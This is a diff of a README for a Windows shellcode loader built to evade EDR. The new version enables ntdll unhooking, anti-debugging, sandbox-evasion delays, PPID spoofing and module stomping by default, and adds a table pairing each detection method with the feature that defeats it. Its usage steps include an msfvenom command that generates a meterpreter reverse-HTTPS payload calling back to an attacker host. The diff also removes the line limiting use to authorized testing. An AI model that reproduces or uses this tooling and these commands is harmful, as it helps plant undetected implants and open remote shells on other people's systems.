@@ -1,150 +1,162 @@
 # Shellcode Loader
 
-A position-independent shellcode loader for Windows x64 using indirect syscalls.
-
-## Overview
-
-This loader executes shellcode using indirect syscalls to avoid userland API hooks. It implements Halo's Gate for dynamic syscall number resolution and uses gadget-based execution to appear as legitimate ntdll activity in call stacks.
+Position-independent shellcode loader for Windows x64 using indirect syscalls.
 
 ## Features
 
-- **Indirect Syscalls**: Jumps to `syscall; ret` gadgets in ntdll.dll
-- **Dynamic SSN Resolution**: Halo's Gate with neighbor scanning for hooked stubs
-- **XOR Encryption**: Rolling XOR with 32-bit key
-- **Anti-Analysis**: Optional debugger detection and timing checks
-- **Module Stomping**: Optional legitimate DLL hollowing
-- **PPID Spoofing**: Optional parent process masquerading
+| Feature | Default | Description |
+|---------|---------|-------------|
+| **Indirect Syscalls** | ON | Jumps to `syscall;ret` gadgets in ntdll.dll |
+| **Halo's Gate** | ON | Dynamic SSN resolution with neighbor scanning |
+| **XOR Encryption** | ON | Rolling XOR with 32-bit key |
+| **UNHOOK** | ON | Fresh ntdll copy from disk bypasses EDR hooks |
+| **ANTIDEBUG** | ON | Timing checks, PEB flags, heap flags |
+| **DELAY** | ON | Random sleeps to evade sandbox acceleration |
+| **PPID SPOOF** | ON | Parent process spoofing |
+| **MODULE STOMP** | ON | Hollows legitimate DLL for shellcode |
+| **CRT Independent** | ON | No msvcrt.dll dependency |
 
 ## Architecture
 
 ```mermaid
 flowchart TD
-    subgraph Initialization
-        A[Entry Point] --> B[InitSyscalls]
+    subgraph Init
+        A[Entry] --> B[InitSyscalls]
         B --> C[Walk PEB for ntdll]
         C --> D[Find syscall/ret gadget]
-        D --> E[Resolve SSNs via Halos Gate]
+        D --> E[Halo's Gate SSN resolution]
+    end
+
+    subgraph Evasion
+        E --> F{ANTIDEBUG?}
+        F -->|Yes| G[Timing + PEB checks]
+        G --> H{UNHOOK?}
+        F -->|No| H
+        H -->|Yes| I[Map fresh ntdll]
+        H -->|No| J{SPOOF?}
+        I --> J
+        J -->|Yes| K[PPID Spoofing]
+        J -->|No| L{STOMP?}
+        K --> L
+        L -->|Yes| M[Hollow legitimate DLL]
+        L -->|No| N[Allocate Memory]
+        M --> N
     end
 
     subgraph Execution
-        E --> F[Allocate RW Memory]
-        F --> G[Copy Encrypted Shellcode]
-        G --> H[XOR Decrypt In-Place]
-        H --> I[Change Protection to RX]
-        I --> J[Create Thread at Entry]
-        J --> K[Wait for Completion]
-    end
-
-    subgraph Syscall Flow
-        L[Wrapper Function] --> M[Load SSN to RAX]
-        M --> N[Setup Args per x64 ABI]
-        N --> O[JMP to ntdll gadget]
-        O --> P[syscall instruction]
-        P --> Q[ret to caller]
+        N --> O[Copy + Decrypt Shellcode]
+        O --> P[RW -> RX Protection]
+        P --> Q[Create Thread]
+        Q --> R[Execute Payload]
     end
 ```
 
-## Indirect Syscall Mechanism
+## Syscalls (17 Total)
 
-```mermaid
-sequenceDiagram
-    participant Loader
-    participant ASM Stub
-    participant ntdll
-    participant Kernel
+| Syscall | Args | Purpose |
+|---------|------|---------|
+| NtAllocateVirtualMemory | 6 | Memory allocation |
+| NtProtectVirtualMemory | 5 | Memory protection |
+| NtFreeVirtualMemory | 4 | Memory cleanup |
+| NtCreateThreadEx | 11 | Thread creation |
+| NtWaitForSingleObject | 3 | Synchronization |
+| NtDelayExecution | 2 | Sleep/delays |
+| NtClose | 1 | Handle cleanup |
+| NtQueryInformationProcess | 5 | Process info |
+| NtReadVirtualMemory | 5 | Memory read |
+| NtWriteVirtualMemory | 5 | Memory write |
+| NtQueryVirtualMemory | 6 | Memory query |
+| NtOpenProcessToken | 3 | Token access |
+| NtTerminateProcess | 2 | Process termination |
+| NtOpenProcess | 4 | Process access |
+| NtOpenSection | 3 | Section access (UNHOOK) |
+| NtMapViewOfSection | 10 | Map section (UNHOOK) |
+| NtUnmapViewOfSection | 2 | Unmap section (UNHOOK) |
 
-    Loader->>ASM Stub: Call SysNtAllocateVirtualMemory(gadget, ssn, ...)
-    ASM Stub->>ASM Stub: mov rax, ssn
-    ASM Stub->>ASM Stub: Setup r10, rdx, r8, r9
-    ASM Stub->>ASM Stub: Shift stack arguments
-    ASM Stub->>ntdll: jmp gadget (syscall/ret)
-    ntdll->>Kernel: syscall
-    Kernel-->>ntdll: return
-    ntdll-->>Loader: ret
-```
+## Build
 
-## SSN Resolution (Halos Gate)
-
-```mermaid
-flowchart LR
-    A[Find Export] --> B{Stub Clean?}
-    B -->|Yes| C[Read SSN at offset +4]
-    B -->|No| D[Check Neighbors]
-    D --> E[Scan Up/Down by stub size]
-    E --> F{Found Clean Stub?}
-    F -->|Yes| G[Calculate SSN from offset]
-    F -->|No| H[Resolution Failed]
-```
-
-## Build Requirements
-
-- Visual Studio 2019/2022 with C++ workload
+**Requirements:**
+- Visual Studio 2019/2022 (C++ workload)
 - Windows SDK
-- Python 3.x (for shellcode embedding)
+- Python 3.x
 
-## Build Instructions
+**Steps:**
+```batch
+# 1. Generate encrypted shellcode header
+python embed.py -i payload.bin -o shellcode.h
 
-1. Generate shellcode (Cobalt Strike, msfvenom, Donut, etc.)
-2. Embed shellcode:
-   ```
-   python embed.py -i payload.bin -o shellcode.h -k 0xDEADBEEF
-   ```
-3. Build from VS x64 Native Tools Command Prompt:
-   ```
-   build.bat
-   ```
-
-## Project Structure
-
-```
-loader.cpp       # Main loader logic
-syscalls.asm     # Indirect syscall stubs
-syscalls.h       # Syscall declarations
-ntstructs.h      # NT structure definitions
-obfuscation.h    # String hashing, XOR routines
-embed.py         # Shellcode embedder with encryption
-build.bat        # Build script
-README.md
+# 2. Build (from VS x64 Native Tools Command Prompt)
+build.bat
 ```
 
 ## Configuration
 
-Edit defines in `loader.cpp`:
+Edit `loader.cpp` to toggle features:
 
-| Option | Description |
-|--------|-------------|
-| `CFG_UNHOOK` | Unhook ntdll via fresh copy |
-| `CFG_ANTIDEBUG` | Enable anti-debugging checks |
-| `CFG_DELAY` | Add execution delays |
-| `CFG_SPOOF` | PPID spoofing |
-| `CFG_STOMP` | Module stomping |
-| `CFG_DEBUG` | Debug logging (disable for production) |
+```c
+#define CFG_UNHOOK      1   // Fresh ntdll from disk
+#define CFG_ANTIDEBUG   1   // Debugger detection
+#define CFG_DELAY       1   // Sandbox evasion delays
+#define CFG_SPOOF       1   // PPID spoofing
+#define CFG_STOMP       1   // Module stomping
+#define CFG_DEBUG       0   // Debug logging (enable for troubleshooting)
+```
 
-## Syscalls Implemented
+## Files
 
-| Syscall | Purpose |
-|---------|---------|
-| NtAllocateVirtualMemory | Memory allocation |
-| NtProtectVirtualMemory | Memory protection changes |
-| NtFreeVirtualMemory | Memory deallocation |
-| NtCreateThreadEx | Thread creation |
-| NtWaitForSingleObject | Synchronization |
-| NtClose | Handle cleanup |
-| NtQueryInformationProcess | Process info |
-| NtReadVirtualMemory | Memory read |
-| NtDelayExecution | Sleep |
-| NtOpenProcessToken | Token access |
+```
+loader.cpp      Main loader (~29KB)
+syscalls.asm    17 indirect syscall stubs
+syscalls.h      Syscall declarations
+ntstructs.h     NT structure definitions
+obfuscation.h   Compile-time string encryption + hashing
+embed.py        Shellcode XOR encryptor
+build.bat       Build script
+```
+
+## OPSEC Notes
+
+- **No CRT dependency** - Custom memset/wcslen implementations
+- **Minimal imports** - Only ntdll.dll used
+- **Indirect syscalls** - Call stack shows ntdll, not loader
+- **Encrypted strings** - Compile-time XOR obfuscation
+- **No static signatures** - Fresh compile recommended
 
 ## Detection Considerations
 
-- Call stack shows return address in ntdll (gadget location)
-- ETW kernel telemetry still captures syscall activity
-- Memory allocation patterns may be flagged by heuristics
-- Encrypted shellcode has higher entropy
+| Technique | Mitigation |
+|-----------|------------|
+| Userland hooks | UNHOOK feature |
+| Sandbox | DELAY + ANTIDEBUG |
+| Process lineage | PPID SPOOF |
+| Memory scanning | MODULE STOMP |
+| Static analysis | String encryption |
+| Import analysis | Syscalls only |
 
-## Usage Notes
+## Usage
 
-This tool is intended for authorized security testing, red team operations, and security research. Ensure you have explicit authorization before use.
+```batch
+# Generate payload (example with msfvenom)
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=x.x.x.x LPORT=443 -f raw -o payload.bin
+
+# Or use Donut for .NET/PE
+donut.exe -i implant.exe -o payload.bin
+
+# Embed and build
+python embed.py -i payload.bin -o shellcode.h
+build.bat
+
+# Execute
+loader.exe
+```
+
+## Troubleshooting
+
+If no callback:
+1. Set `CFG_DEBUG 1` in loader.cpp
+2. Rebuild
+3. Run loader.exe
+4. Check `debug.log` for errors
 
 ## License
 
